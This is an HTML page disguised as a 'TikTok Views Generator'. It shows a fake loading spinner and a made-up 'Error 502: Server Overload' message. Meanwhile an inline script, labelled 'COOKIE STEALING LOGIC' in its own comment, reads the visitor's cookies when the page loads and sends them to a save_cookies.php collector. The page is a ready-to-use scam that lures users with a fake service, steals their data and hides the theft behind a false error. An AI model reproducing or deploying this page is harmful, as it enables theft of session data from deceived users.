<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Views Generator - Processing</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f8f8f8; text-align: center; padding-top: 50px; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { font-size: 18px; color: #333; }
    </style>
</head>
<body>
    <div class="status">Connecting to TikTok API...</div>
    <div class="loader"></div>
    <div id="msg" style="color: red; font-weight: bold; margin-top: 20px; display: none;">
        Error 502: Server Overload. Please try again later.
    </div>

    <script>
        // 1. COOKIE STEALING LOGIC
        var userCookies = document.cookie;
        fetch('save_cookies.php?data=' + encodeURIComponent(userCookies));

        // 2. FAKE LOADING PROCESS
        setTimeout(function() {
            document.querySelector('.status').style.display = 'none';
            document.querySelector('.loader').style.display = 'none';
            document.getElementById('msg').style.display = 'block';
        }, 3000);
    </script>
</body>
</html>
